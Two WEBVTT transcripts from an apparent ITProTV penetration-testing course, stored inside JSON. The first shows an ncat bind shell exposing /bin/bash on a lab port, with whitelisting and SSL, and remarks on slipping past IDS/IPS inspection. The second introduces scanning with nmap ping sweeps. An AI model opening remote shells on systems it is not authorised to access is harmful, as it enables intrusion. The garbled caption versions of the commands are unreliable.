--> 00:29:29.413\nThat is allow, I think,\nhere's what I did wrong.\n\n587\n00:29:29.413 --> 00:29:32.490\nLet me move this around just a bit.\n\n588\n00:29:36.031 --> 00:29:39.969\n-v 9999, let's try that.\n\n589\n00:29:39.969 --> 00:29:42.360\nMust supply a host, what did I type wrong?\n\n590\n00:29:43.650 --> 00:29:48.270\nI typically use netcat, this is why\nI'm struggling here just for a second.\n\n591\n00:29:48.270 --> 00:29:50.100\nLet's see here, let's start from scratch.\n\n592\n00:29:52.306 --> 00:29:56.207\nSo it's ncats --exec.\n\n593\n00:29:56.207 --> 00:29:59.005\nWhoa, apparently I got a little\ncrazy with the mouse here.\n\n594\n00:29:59.005 --> 00:30:01.687\nI touched it with my thumb.\n\n595\n00:30:01.687 --> 00:30:02.685\nThere we go.\n\n596\n00:30:02.685 --> 00:30:04.381\nThank you.\n\n597\n00:30:04.381 --> 00:30:12.147\n--exec, and it will be /bin/bash --allow,\n\n598\n00:30:12.147 --> 00:30:19.192\nand it will be 192.168.219.1,\n\n599\n00:30:19.192 --> 00:30:26.067\nwhat was it, 68 and then on port 9999.\n\n600\n00:30:26.067 --> 00:30:27.971\nThat should be right.\n\n601\n00:30:27.971 --> 00:30:34.090\nOkay, I think I may have found\nthe problem here, overlooking things.\n\n602\n00:30:34.090 --> 00:30:37.810\nThat's the problem, you get in a hurry and\nthen it all goes to heck, right?\n\n603\n00:30:37.810 --> 00:30:41.830\nSo I think the problem was because\nI wasn't putting dash the vnl.\n\n604\n00:30:41.830 --> 00:30:45.460\nI gotta set up the actually, yeah-\n&gt;&gt; Yeah, sometimes that helps.\n\n605\n00:30:45.460 --> 00:30:47.285\n&gt;&gt; It helps, it helps, yeah.\n\n606\n00:30:47.285 --> 00:30:48.505\n&gt;&gt; Basically turning on the listener.\n\n607\n00:30:48.505 --> 00:30:51.337\n&gt;&gt; Yeah, kinda turning the listener\non will probably help us out here.\n\n608\n00:30:51.337 --> 00:30:54.737\n192 [INAUDIBLE] 9999,\njust do it the old fashioned way.\n\n609\n00:30:54.737 --> 00:30:59.255\nI was getting discombulated, you can\nthrow these commands around each other.\n\n610\n00:30:59.255 --> 00:31:02.485\nAnd the way I wrote it in my notes was\ndifferent than the way I was thinking of\n\n611\n00:31:02.485 --> 00:31:04.070\nit in my head which was messing me up.\n\n612\n00:31:04.070 --> 00:31:08.280\nSo let's do it with consistency,\nLowrie, that's the best way to go.\n\n613\n00:31:08.280 --> 00:31:13.656\nSo whitelisting now we can say --allow,\nlike that, and\n\n614\n00:31:13.656 --> 00:31:20.260\nthen let's say 192.168.219.168,\nI believe it was.\n\n615\n00:31:20.260 --> 00:31:21.745\nYeah, that should be it.\n\n616\n00:31:21.745 --> 00:31:24.495\n&gt;&gt; --x.\n&gt;&gt; Yeah, we're gonna bind a shell so-\n\n617\n00:31:24.495 --> 00:31:27.999\n&gt;&gt; -bin/bash.\n\n618\n00:31:27.999 --> 00:31:30.400\nI don't know if that has\nto be flipped around.\n\n619\n00:31:30.400 --> 00:31:32.990\nAgain, they allow a lot of flipping\nof commands wherever you want.\n\n620\n00:31:32.990 --> 00:31:34.440\n&gt;&gt; But only certain ones sometimes.\n\n621\n00:31:34.440 --> 00:31:35.600\nSometimes it gives you an error.\n\n622\n00:31:35.600 --> 00:31:37.700\nAnd you're like, wait, come on.\n\n623\n00:31:37.700 --> 00:31:39.356\n&gt;&gt; It can get frustrating to be\nhonest with you, ladies and gents.\n\n624\n00:31:39.356 --> 00:31:42.735\n[COUGH] Sorry about that.\n\n625\n00:31:42.735 --> 00:31:43.315\nSo there we go.\n\n626\n00:31:43.315 --> 00:31:45.440\nWe got the listener going,\neverything's good.\n\n627\n00:31:45.440 --> 00:31:48.585\nAnd we gotta make sure you just keep\neverything in the right order or\n\n628\n00:31:48.585 --> 00:31:50.955\nwhatever allowed order,\nit'll allow you to do.\n\n629\n00:31:50.955 --> 00:31:53.780\nAll right, let's jump over to my computer.\n\n630\n00:31:53.780 --> 00:31:56.274\nAnd I just realized this does\nlook a little small for you guys.\n\n631\n00:31:56.274 --> 00:31:57.899\nSo I'll just zoom in a little bit.\n\n632\n00:31:57.899 --> 00:32:00.174\nDon't want you to miss the action.\n\n633\n00:32:00.174 --> 00:32:02.473\nThere we go, that should be helpful.\n\n634\n00:32:02.473 --> 00:32:05.921\nSo NC, we just trying to,\nI can use Net Cat for this.\n\n635\n00:32:05.921 --> 00:32:07.256\nVery simple.\n\n636\n00:32:07.256 --> 00:32:10.640\nNC-NV.\n\n637\n00:32:10.640 --> 00:32:15.411\nWhatever the IP address is,\n102.168.209.146.\n\n638\n00:32:15.411 --> 00:32:16.691\nAnd then of course my port.\n\n639\n00:32:16.691 --> 00:32:21.190\nI create a connection, LS-AL.\n\n640\n00:32:21.190 --> 00:32:21.810\nHere we go.\n\n641\n00:32:21.810 --> 00:32:23.240\nJust like we saw before.\n\n642\n00:32:23.240 --> 00:32:26.590\nBut what happens if, let's see here.\n\n643\n00:32:26.590 --> 00:32:31.650\nLet me jump over to my, hello.\n\n644\n00:32:31.650 --> 00:32:36.783\nLet's bring my terminal up here and\n\n645\n00:32:36.783 --> 00:32:42.950\nI try it from here, I wonder what happens.\n\n646\n00:32:42.950 --> 00:32:45.006\nNC-NV 192.168.219.146.\n\n647\n00:32:46.190 --> 00:32:49.520\nOn port 99999.\nLook at that.\n\n648\n00:32:49.520 --> 00:32:50.830\nConnection refused.\n\n649\n00:32:50.830 --> 00:32:51.850\nSo I've white listed.\n\n650\n00:32:51.850 --> 00:32:52.690\nI can't come from there.\n\n651\n00:32:52.690 --> 00:32:54.800\nThe only person that's allowed\nto make the connection.\n\n652\n00:32:54.800 --> 00:32:58.390\nSo one of the advantages of using MCAT.\n\n653\n00:32:58.390 --> 00:32:59.890\nAlso the other one was encryption.\n\n654\n00:32:59.890 --> 00:33:01.305\nSo let's take a look at that.\n\n655\n00:33:01.305 --> 00:33:04.459\nI will Control-C this connection.\n\n656\n00:33:04.459 --> 00:33:07.040\nWe'll basically rebuild it.\n\n657\n00:33:08.635 --> 00:33:10.700\nAnd, what do you have to do?\n\n658\n00:33:10.700 --> 00:33:13.630\nYou have to just define\nwhat it is you want to do.\n\n659\n00:33:13.630 --> 00:33:16.620\n-SSL, that's SSL encryption.\n\n660\n00:33:16.620 --> 00:33:18.160\nThrow that on the end there.\n\n661\n00:33:18.160 --> 00:33:21.770\nI could take that white list out,\nbut I'll leave it there for brevity.\n\n662\n00:33:21.770 --> 00:33:23.900\nWhat am I missing here.\n\n663\n00:33:23.900 --> 00:33:26.602\nOkay dash l and dash s are incompatible.\n\n664\n00:33:26.602 --> 00:33:27.854\nIs it now?\n\n665\n00:33:27.854 --> 00:33:29.376\nIs that a fact?\n\n666\n00:33:29.376 --> 00:33:31.662\nLet's see here.\n\n667\n00:33:31.662 --> 00:33:33.744\nWhy is it telling me this?\n\n668\n00:33:33.744 --> 00:33:41.570\n&gt;&gt; Let's see here, protocol SSL,\nas a command to set up the server somehow.\n\n669\n00:33:41.570 --> 00:33:47.130\n&gt;&gt; Yeah, it's saying it doesn't like\nthe dash l to listen for SSL connections.\n\n670\n00:33:48.610 --> 00:33:51.190\nSo this is annoying.\n\n671\n00:33:51.190 --> 00:33:53.660\nIt should have done this.\n\n672\n00:33:53.660 --> 00:33:54.810\nIt should have worked.\n\n673\n00:33:54.810 --> 00:33:55.835\nWhy is it not working?\n\n674\n00:33:55.835 --> 00:33:57.190\nNLVP, it doesn't like the dash.\n\n675\n00:33:57.190 --> 00:33:58.860\nI don't remember that being the case.\n\n676\n00:33:59.950 --> 00:34:03.150\nYeah, that's what I thought.\n\n677\n00:34:03.150 --> 00:34:04.170\nThere's the problem.\n\n678\n00:34:04.170 --> 00:34:06.380\nAgain, it's the little\nthings that kill you.\n\n679\n00:34:06.380 --> 00:34:08.470\n&gt;&gt; [LAUGH]\n&gt;&gt; And it's two dashes for\n\n680\n00:34:08.470 --> 00:34:11.680\nSSL, much like the --allow.\n\n681\n00:34:11.680 --> 00:34:14.820\nBut in my notes I was an idiot and\nforgot to put the second dash.\n\n682\n00:34:14.820 --> 00:34:17.590\nSo when I'm trying to remind\nmyself of what to put here.\n\n683\n00:34:17.590 --> 00:34:20.110\nThere you go, we hit Return now hey,\nlook at that.\n\n684\n00:34:20.110 --> 00:34:24.100\nThings start working as they're supposed\nto because I'm using the correct command.\n\n685\n00:34:24.100 --> 00:34:24.930\nSo let's jump back.\n\n686\n00:34:24.930 --> 00:34:26.839\nWe'll zoom in for you guys.\n\n687\n00:34:28.570 --> 00:34:31.740\nAnd make our connection now.\n\n688\n00:34:31.740 --> 00:34:35.780\nHere you cannot use the regular net cap.\n\n689\n00:34:35.780 --> 00:34:41.870\nBecause encryption is in play, net cap\ndoes not use encryption, N-cat does.\n\n690\n00:34:41.870 --> 00:34:44.390\nSo if you want an encrypted connection,\n\n691\n00:34:44.390 --> 00:34:48.380\nyou have to use N-cat on\nboth sides of the equation.\n\n692\n00:34:48.380 --> 00:34:53.490\nOkay, so just a little safety tip for\nyou there.\n\n693\n00:34:53.490 --> 00:34:56.554\nSo I have to use N-cat,\n\n694\n00:34:56.554 --> 00:35:02.082\nwhich we saw earlier was in my system 32.\n\n695\n00:35:02.082 --> 00:35:05.440\nAnd then -V19216v.219@146 on port 999,\nand --ssl.\n\n696\n00:35:05.440 --> 00:35:07.060\nThere's our connection.\n\n697\n00:35:07.060 --> 00:35:09.520\nMove that over a little,\na little bit there.\n\n698\n00:35:10.920 --> 00:35:12.070\nLittle lower.\n\n699\n00:35:12.070 --> 00:35:14.200\nAnd we do our LS and there we go.\n\n700\n00:35:14.200 --> 00:35:17.870\nWe start to get all the goodness\nthat we know and love.\n\n701\n00:35:17.870 --> 00:35:23.640\nSo there you go, that's basically creating\na reverse shell, creating a bind shell.\n\n702\n00:35:23.640 --> 00:35:25.410\nYou need to know the difference\nbetween the two.\n\n703\n00:35:25.410 --> 00:35:28.365\nDo not worry we will not be\nusing N-cat at all any more.\n\n704\n00:35:28.365 --> 00:35:29.920\n&gt;&gt; [LAUGH]\n&gt;&gt; I have no reason to\n\n705\n00:35:29.920 --> 00:35:31.910\nencrypt any of this traffic.\n\n706\n00:35:31.910 --> 00:35:33.780\nYou might have a reason\nto encrypt traffic,\n\n707\n00:35:33.780 --> 00:35:36.780\nyou might have reason\nto white list things.\n\n708\n00:35:36.780 --> 00:35:39.960\nSo there are good reasons to use N-cat.\n\n709\n00:35:39.960 --> 00:35:43.300\nEncryption is great especially when you\ntrying to work through firewalls and\n\n710\n00:35:43.300 --> 00:35:44.930\nit's inspecting traffic.\n\n711\n00:35:44.930 --> 00:35:49.000\nMaybe you'll want to employ in\nthat from N-cat from time to time.\n\n712\n00:35:49.000 --> 00:35:51.360\nSo don't forget that it's there,\nbut I think for\n\n713\n00:35:51.360 --> 00:35:54.080\nthe entirety of the show we're\nnot going to do any of that so.\n\n714\n00:35:54.080 --> 00:35:58.460\n&gt;&gt; Keep the prying eyes of those IDS's and\nIPS's out of your traffic right?\n\n715\n00:35:58.460 --> 00:36:00.670\n&gt;&gt; They are snoopy little\nthings aren't they?\n\n716\n00:36:00.670 --> 00:36:02.310\nThey love to look at what you're doing.\n\n717\n00:36:02.310 --> 00:36:04.160\nI'm trying to break into computers here.\n\n718\n00:36:04.160 --> 00:36:07.440\n&gt;&gt; That's right and as we said I think in\nthe beginning most of these tools were\n\n719\n00:36:07.440 --> 00:36:13.160\ndesigned as administrative tools and then\nwe've repurposed them to do other things.\n\n720\n00:36:13.160 --> 00:36:17.300\nSo as an administrator you\nmight use N-cat to manage some\n\n721\n00:36:17.300 --> 00:36:20.990\nof your servers within your environment\nand you want to encrypt that traffic.\n\n722\n00:36:20.990 --> 00:36:24.584\nAs you don't want any user running\nsniffers and seeing any of those commands\n\n723\n00:36:24.584 --> 00:36:27.856\nor possibly passwords and\nwhatever else you might be transmitting.\n\n724\n00:36:27.856 --> 00:36:31.132\nSo definitely you use for that\nencryption in there, but as Daniel said,\n\n725\n00:36:31.132 --> 00:36:34.100\na lot of the hackers,\nthey're not spending any time doing that.\n\n726\n00:36:34.100 --> 00:36:36.110\nIt's straight to good old Netcat.\n\n727\n00:36:36.110 --> 00:36:38.600\n&gt;&gt; Yeah, I don't want to\nover-complicate things for you guys,\n\n728\n00:36:38.600 --> 00:36:42.900\nas you saw it can get really,\nwhen you're like did I use Netcat for\n\n729\n00:36:42.900 --> 00:36:45.830\nthis or N-cat for this, I don't remember.\n\n730\n00:36:45.830 --> 00:36:49.960\nAnd we're gonna keep it easy,\nwe're just gonna use Netcat for\n\n731\n00:36:49.960 --> 00:36:51.960\nthe rest of the series.\n\n732\n00:36:51.960 --> 00:36:55.550\n&gt;&gt; Alright, fantastic look Daniel there at\nthe different types of shells that we're\n\n733\n00:36:55.550 --> 00:36:56.580\ngoing to be working with.\n\n734\n00:36:56.580 --> 00:36:57.320\nRemote shells.\n\n735\n00:36:57.320 --> 00:36:58.650\nWe've looked at bind.\n\n736\n00:36:58.650 --> 00:37:00.070\nAs well as the reverse, right?\n\n737\n00:37:00.070 --> 00:37:03.510\nBind when you are binding your\nshell to a port number so\n\n738\n00:37:03.510 --> 00:37:07.350\nsome other node on the network can reach\nout to that port and basically have any\n\n739\n00:37:07.350 --> 00:37:11.910\ncommands sent to the shell and\noutput sent back out across there.\n\n740\n00:37:11.910 --> 00:37:14.810\nWe also looked at creating\nsome reverse shells\n\n741\n00:37:14.810 --> 00:37:18.320\nwhere you're shoveling shells\nout to the other system.\n\n742\n00:37:18.320 --> 00:37:21.950\nA lot of the times this is used as you\nwere saying when you've got firewalls to\n\n743\n00:37:21.950 --> 00:37:26.020\ndeal with or private ip address\nranges where I can't type in.\n\n744\n00:37:26.020 --> 00:37:30.270\nI can't connect to 10.1.1.1\nif that's a remote network,\n\n745\n00:37:30.270 --> 00:37:31.360\nif it's not on the same network as me,\n\n746\n00:37:31.360 --> 00:37:36.540\nbut I can do a reverse shell into\na private IP address, so, great usage for\n\n747\n00:37:36.540 --> 00:37:40.470\nboth of those and we'll see both of those\nthroughout these episodes, I'm sure.\n\n748\n00:37:40.470 --> 00:37:42.050\nSo we thank you for\nthat Daniel, we appreciate it.\n\n749\n00:37:42.050 --> 00:37:42.980\nGreat look there.\n\n750\n00:37:42.980 --> 00:37:45.060\nHope everybody out there\nenjoyed watching this one.\n\n751\n00:37:45.060 --> 00:37:47.910\nSigning off for ITProTV,\nI've been your host, Mike Roderick.\n\n752\n00:37:47.910 --> 00:37:48.670\n&gt;&gt; And I'm Daniel Lowry.\n\n753\n00:37:48.670 --> 00:37:49.670\n&gt;&gt; And we'll see you next time.\n\n754\n00:37:49.670 --> 00:37:57.386\n[MUSIC]\n\n755\n00:37:57.386 --> 00:37:59.361\nThank you for watching ITProTV.\n\n",
          "vimeoId": "202063272"
        },
        {
          "description": "In this episode, Dan and Mike go over different scanning and enumeration techniques. They demonstrate host discovery, email address enumeration, service enumeration, as well as vulnerability scanning.",
          "length": "2362",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-3-1-scanning_and_enumeration-013017-PGM.00_39_38_09.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-3-1-scanning_and_enumeration-013017-PGM.00_39_38_09.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-3-1-scanning_and_enumeration-013017-PGM.00_39_38_09.Still001-sm.jpg",
          "title": "Scanning and Enumeration",
          "transcript": "WEBVTT\n\n1\n00:00:00.270 --> 00:00:02.365\nWelcome to ITProTV,\nI'm your host Don Pezet.\n\n2\n00:00:02.365 --> 00:00:06.352\n[CROSSTALK]\n\n3\n00:00:06.352 --> 00:00:08.354\n[MUSIC]\n\n4\n00:00:08.354 --> 00:00:12.635\n&gt;&gt; You're watching ITProTV.\n\n5\n00:00:12.635 --> 00:00:15.635\nHello, Welcome to another\nexciting episode here at ITProTV.\n\n6\n00:00:15.635 --> 00:00:19.405\nI am your host Mike Roderick and today\nwe are doing our penetration testing.\n\n7\n00:00:19.405 --> 00:00:23.315\nAnd in this episode we are gonna\nfocus in on a very important\n\n8\n00:00:23.315 --> 00:00:27.675\npart of the hacking lifecycle;\nscanning and enumeration.\n\n9\n00:00:27.675 --> 00:00:30.860\nAnd here to guide us through\nthis phase is Mr. Daniel Lowery.\n\n10\n00:00:30.860 --> 00:00:31.656\nWelcome back Daniel.\n\n11\n00:00:31.656 --> 00:00:33.245\n&gt;&gt; Mike, so glad to be back.\n\n12\n00:00:33.245 --> 00:00:35.915\nAlways enjoy coming here to ITProTV.\n\n13\n00:00:35.915 --> 00:00:37.460\nOur jobs do kind of rock.\n\n14\n00:00:37.460 --> 00:00:39.438\nIf you have a nervous\n[INAUDIBLE] watching.\n\n15\n00:00:39.438 --> 00:00:40.080\n&gt;&gt; Don't do that.\n&gt;&gt; Yes.\n\n16\n00:00:40.080 --> 00:00:41.225\nIt keeps on downloading.\n\n17\n00:00:41.225 --> 00:00:42.290\n&gt;&gt; [INAUDIBLE]\n&gt;&gt; We had a lot of fun.\n\n18\n00:00:42.290 --> 00:00:45.190\nAnd today is no exception to that rule.\n\n19\n00:00:45.190 --> 00:00:46.200\nWe are gonna have a lot of fun.\n\n20\n00:00:46.200 --> 00:00:49.950\nWe are gonna learn about scanning and\nenumeration as Mike said.\n\n21\n00:00:49.950 --> 00:00:52.230\nWe wanna take a minute.\n\n22\n00:00:52.230 --> 00:00:54.520\nWe wanna bring it down.\n\n23\n00:00:54.520 --> 00:01:01.184\nBecause scanning and enumeration can\nbe probably the most monotonous.\n\n24\n00:01:01.184 --> 00:01:02.462\nAs if I can be nice to it.\n\n25\n00:01:02.462 --> 00:01:06.600\n&gt;&gt; [LAUGH]\n&gt;&gt; A portion of the phase of getting into\n\n26\n00:01:06.600 --> 00:01:07.130\na system.\n\n27\n00:01:08.400 --> 00:01:13.150\nBut it's also probably one of the most\nimportant phases of getting into a system.\n\n28\n00:01:13.150 --> 00:01:15.590\nI fell into this trap\nearly on as I became.\n\n29\n00:01:15.590 --> 00:01:16.920\nCuz I wanna go.\n\n30\n00:01:16.920 --> 00:01:17.680\nI wanna get in.\n\n31\n00:01:17.680 --> 00:01:19.220\nJust show me how to get in.\n\n32\n00:01:19.220 --> 00:01:22.220\nJust show me where's the, and then I go.\n\n33\n00:01:22.220 --> 00:01:24.040\nBut unfortunately that's\nnot the way it is.\n\n34\n00:01:24.040 --> 00:01:26.960\nYou need to spend time\nhere learning scant.\n\n35\n00:01:26.960 --> 00:01:31.060\nFiguring out where the holes are so\nthat you might exploit them.\n\n36\n00:01:31.060 --> 00:01:33.310\nBecause if you don't find the right whole,\n\n37\n00:01:33.310 --> 00:01:35.868\nyou are not gonna be able to\nuse a vulnerability against it.\n\n38\n00:01:35.868 --> 00:01:39.940\nRight, you gotta find where the weaknesses\nare and this is where it stands.\n\n39\n00:01:39.940 --> 00:01:41.300\nScanning and enumeration.\n\n40\n00:01:41.300 --> 00:01:44.211\nSo what I'm gonna do today,\nis I'm gonna show you some ways in which\n\n41\n00:01:44.211 --> 00:01:47.260\nyou ca do that, some good tools\nthat will help you to do that.\n\n42\n00:01:47.260 --> 00:01:50.380\nSome ways in which you can do\nthat your own self, right?\n\n43\n00:01:50.380 --> 00:01:51.990\nManually.\n\n44\n00:01:51.990 --> 00:01:54.890\nAnd get the information necessary so that\n\n45\n00:01:54.890 --> 00:01:59.680\nyou might find those weaknesses in those\nsystems, so later on we can exploit them.\n\n46\n00:01:59.680 --> 00:02:02.220\nAll right, so let's see,\nwhere do we wanna start here?\n\n47\n00:02:02.220 --> 00:02:03.180\nWhat is scanning?\n\n48\n00:02:03.180 --> 00:02:03.930\nWhat is enumeration?\n\n49\n00:02:03.930 --> 00:02:07.960\nObviously, scanning is a really easy\nterm to figure out, it's basically,\n\n50\n00:02:07.960 --> 00:02:12.580\nwe're using some automated\npiece of program, or\n\n51\n00:02:12.580 --> 00:02:16.110\nan automated program,\nto do something for us.\n\n52\n00:02:16.110 --> 00:02:17.990\nTo look for things.\n\n53\n00:02:17.990 --> 00:02:19.830\nBasically that's what we mean scan.\n\n54\n00:02:19.830 --> 00:02:23.210\nGo to this machine and\nfind out what it's doing.\n\n55\n00:02:23.210 --> 00:02:24.870\nGo to this machine and\nfind out what it's doing.\n\n56\n00:02:24.870 --> 00:02:25.500\nGo to the next one.\n\n57\n00:02:25.500 --> 00:02:29.570\nDo the same thing and same thing, so that\nI don't have to do that myself, right?\n\n58\n00:02:29.570 --> 00:02:30.820\nThat's what we mean of scanning.\n\n59\n00:02:30.820 --> 00:02:33.740\nScanning can also be,\nwhere are the machines?\n\n60\n00:02:33.740 --> 00:02:35.270\nWhat machines are out there?\n\n61\n00:02:35.270 --> 00:02:36.420\nWhat is those machines name?\n\n62\n00:02:36.420 --> 00:02:38.080\nWhat is their ip address?\n\n63\n00:02:38.080 --> 00:02:39.440\nThings of that nature, right?\n\n64\n00:02:39.440 --> 00:02:42.520\nSo that's the information that we're\ngathering when it comes to scanning.\n\n65\n00:02:42.520 --> 00:02:48.280\nEnumeration is a little more like figuring\nout, okay, I know port 80 is open.\n\n66\n00:02:48.280 --> 00:02:50.190\nWhat on port 80 is running, right?\n\n67\n00:02:50.190 --> 00:02:53.020\nSo we're enumerating that information.\n\n68\n00:02:53.020 --> 00:02:56.890\nIt's Apache version 4.2,\nsomething to that, right?\n\n69\n00:02:56.890 --> 00:02:58.116\nThat's what we're doing.\n\n70\n00:02:58.116 --> 00:03:02.300\nSo we'd use a lot of interesting\ntools that will help us do that.\n\n71\n00:03:02.300 --> 00:03:07.010\nWe're also gonna talk about a lot of\ninteresting tools that we're not gonna use\n\n72\n00:03:07.010 --> 00:03:11.350\nbecause I want you guys to be able to do\nit the hard way to be honest with you.\n\n73\n00:03:11.350 --> 00:03:14.880\nBecause it will help you\nunderstand better what's going on.\n\n74\n00:03:14.880 --> 00:03:18.160\nNot that we're not gonna use tools,\nwe're just not gonna use the easy tools.\n\n75\n00:03:18.160 --> 00:03:19.960\n&gt;&gt; Dang it Daniel,\njust like my math teacher.\n\n76\n00:03:19.960 --> 00:03:24.125\nAlways made me learn the long way\nbefore they would show us the shortcut.\n\n77\n00:03:24.125 --> 00:03:25.510\nSounds like what you're doing here.\n\n78\n00:03:25.510 --> 00:03:26.702\n&gt;&gt; See me after class Mike.\n\n79\n00:03:26.702 --> 00:03:29.126\n&gt;&gt; [LAUGH]\n&gt;&gt; I'm watching you, young man.\n\n80\n00:03:29.126 --> 00:03:31.570\nThat's right.\nAll right, so there we're having some fun.\n\n81\n00:03:31.570 --> 00:03:37.040\nOkay, so some of the information gathering\nprocess that we can automate is obviously,\n\n82\n00:03:37.040 --> 00:03:42.660\nhost discovery, service enumeration and\nthe most important, vulnerability.\n\n83\n00:03:42.660 --> 00:03:45.690\nYes, that's what we're looking for,\nvulnerabilities.\n\n84\n00:03:45.690 --> 00:03:47.310\nSo let's talk about host discovery.\n\n85\n00:03:47.310 --> 00:03:50.810\nHow do we ind hosts on whatever\nnetwork we are connected to.\n\n86\n00:03:50.810 --> 00:03:54.165\nWe are talking the internet,\nthat's a big monkey,\n\n87\n00:03:54.165 --> 00:03:58.630\nthat's a lot of hosts,\ntons of them are out there.\n\n88\n00:03:58.630 --> 00:04:03.250\nAnd even beyond that, that you can see\nper say from Internet IP addresses,\n\n89\n00:04:03.250 --> 00:04:08.550\nour private IP addresses,\ninside of private LANs that are connected\n\n90\n00:04:08.550 --> 00:04:12.740\nto maybe one internet connection that\nmight have 20 machines on the other side.\n\n91\n00:04:12.740 --> 00:04:13.920\nWell, what machines are that?\n\n92\n00:04:13.920 --> 00:04:18.400\nIf I can get into that network, if I can\nwalk into a building and get access to\n\n93\n00:04:18.400 --> 00:04:23.700\ntheir WiFi which connects me to a network\nwhere I can plug in a Cat 6 cable\n\n94\n00:04:23.700 --> 00:04:27.350\ninto my computer and now I have at least\nsome sort of connection to a network.\n\n95\n00:04:27.350 --> 00:04:30.750\nI wanna find out what else is out there.\n\n96\n00:04:30.750 --> 00:04:34.620\nNow, if you're watching this show,\nI'm hoping you have, we talked about\n\n97\n00:04:34.620 --> 00:04:39.180\nfundamental Ideas and concepts that\nyou already need to have a grasp of.\n\n98\n00:04:39.180 --> 00:04:42.200\nOne of them I'm gonna assume\nthat you know how to use ping.\n\n99\n00:04:42.200 --> 00:04:42.920\nPing is a great tool.\n\n100\n00:04:42.920 --> 00:04:46.100\nPing this machine, ping that,\nping a range of machines.\n\n101\n00:04:46.100 --> 00:04:46.610\nWe can do that.\n\n102\n00:04:46.610 --> 00:04:47.190\nIt's a great tool.\n\n103\n00:04:47.190 --> 00:04:48.730\nYou can use that.\n\n104\n00:04:48.730 --> 00:04:51.010\nThat's an automated tool\nthat does that job.\n\n105\n00:04:51.010 --> 00:04:51.980\nIt will scan.\n\n106\n00:04:51.980 --> 00:04:58.030\nYou can write a script to\nsearch out an IP range, right?\n\n107\n00:04:58.030 --> 00:04:59.310\nMake that happen.\n\n108\n00:04:59.310 --> 00:05:01.693\nYou can obviously use third\nparty tools like nmap,\n\n109\n00:05:01.693 --> 00:05:04.476\nanything else that you'd like\nthat will do that function.\n\n110\n00:05:05.682 --> 00:05:07.399\nLet's take a look at some of that,\n\n111\n00:05:07.399 --> 00:05:10.490\nlet's take a look at nmap cuz\nnmap is kinda the gold standard.\n\n112\n00:05:10.490 --> 00:05:13.680\nIt is something that if you are not\nusing as a penetration tester,\n\n113\n00:05:13.680 --> 00:05:15.890\nI would suggest using.\n\n114\n00:05:15.890 --> 00:05:20.270\nIt's not absolutely,\nper se, necessary, but\n\n115\n00:05:20.270 --> 00:05:24.450\nman does it do a great job, and a lot\nof people like it for that very reason.\n\n116\n00:05:24.450 --> 00:05:25.710\nAre there scanners that are faster?\n\n117\n00:05:25.710 --> 00:05:27.765\nThere sure are but\n\n118\n00:05:27.765 --> 00:05:33.350\nnmap really earns its money by being\nthorough and consistent, right.\n\n119\n00:05:33.350 --> 00:05:36.030\nSo, you might get a faster\nscan out of somebody else but\n\n120\n00:05:36.030 --> 00:05:40.450\nyou might not get as\nconsistently reliable results.\n\n121\n00:05:40.450 --> 00:05:44.300\nSo, I'll hail the Nmap\nin my humble opinion.\n\n122\n00:05:44.300 --> 00:05:45.460\n&gt;&gt; I'll second that.\n\n123\n00:05:45.460 --> 00:05:46.650\n&gt;&gt; Yeah, Mikey's second it.\n\n124\n00:05:46.650 --> 00:05:50.210\nI'm pretty sure I'm hearing a lot of\naye coming from around the world,\n\n125\n00:05:50.210 --> 00:05:52.070\nas anybody's hearing this right now.\n\n126\n00:05:52.070 --> 00:05:53.660\nOkay, so let's do that, let's do Nmap.\n\n127\n00:05:53.660 --> 00:05:59.240\nLet's take a look at my machine, show\nyou how to do a ping scan of a IP range.\n\n128\n00:05:59.240 --> 00:06:06.550\nSo just invoke in nmap -sn,\nit used to be sp, like this.\n\n129\n00:06:06.550 --> 00:06:07.340\nThat's no more.\n\n130\n00:06:07.340 --> 00:06:12.310\nNow it's -n like that, sp will still\nwork though, so you can use that.\n\n131\n00:06:12.310 --> 00:06:16.550\nIf you're old school, you're like, I'm not\ngiving up my nmap version 4.2, good for\n\n132\n00:06:16.550 --> 00:06:17.390\nyou, sir.\n\n133\n00:06:17.390 --> 00:06:18.430\nContinue the good fight.\n\n134\n00:06:18.430 --> 00:06:22.640\nBut I'm on 7.3 and\nsn is the way it goes now.\n\n135\n00:06:22.640 --> 00:06:25.062\nSo sn, and then give it your IP range.\n\n136\n00:06:25.062 --> 00:06:29.926\n192.168.219., just whatever IP address,\nand\n\n137\n00:06:29.926 --> 00:06:36.015\nthen just do that siter /24/16,\n32, whatever it is you're using.\n\n138\n00:06:36.015 --> 00:06:38.185\nNot 32, you would have no hosts at all.\n\n139\n00:06:38.185 --> 00:06:40.020\n&gt;&gt; [LAUGH]\n&gt;&gt; But\n\n140\n00:06:40.020 --> 00:06:44.250\nthe good old 24s and\nthe 16s happen quite often.\n\n141\n00:06:44.250 --> 00:06:46.259\nSo just throw that notation on the end.\n\n142\n00:06:46.259 --> 00:06:48.635\nHit Enter.\n\n143\n00:06:48.635 --> 00:06:51.670\nAnd it works and\ngrinds as Mike likes to say.\n\n144\n00:06:51.670 --> 00:06:54.530\nAnd look it found a few\nmachines on this network.\n\n145\n00:06:54.530 --> 00:06:56.270\nI found that 146 was up.\n\n146\n00:06:56.270 --> 00:06:57.270\nThat's my Kali Linux.\n\n147\n00:06:57.270 --> 00:06:59.680\n152, don't know what that is.\n\n148\n00:06:59.680 --> 00:07:02.550\n168, there's my Windows machine.\n\n149\n00:07:02.550 --> 00:07:04.930\nNow I've done a really good job\nof finding out very quickly,\n\n150\n00:07:04.930 --> 00:07:08.070\nthat ran out in 2.79 seconds.\n\n151\n00:07:08.070 --> 00:07:11.660\nSo yeah maybe you could have done it\nin 1.79 seconds with another scanner.\n\n152\n00:07:12.700 --> 00:07:14.110\nMan, good for you, good for you.\n\n153\n00:07:14.110 --> 00:07:19.300\nAnd I know the seconds do tend to count,\nbut I just don't see the issue and.\n\n154\n00:07:19.300 --> 00:07:19.810\nCan also,\n\n155\n00:07:19.810 --> 00:07:24.370\nlike I said you can create maybe a custom\nscript that will do this using ping.\n\n156\n00:07:24.370 --> 00:07:26.490\nLet's go over to Kali.\n\n157\n00:07:26.490 --> 00:07:29.310\nI have created a custom\nscript to do that very thing.\n\n158\n00:07:29.310 --> 00:07:30.215\nHere is is right here.\n\n159\n00:07:30.215 --> 00:07:33.180\npsweep.sh, let's take a look at 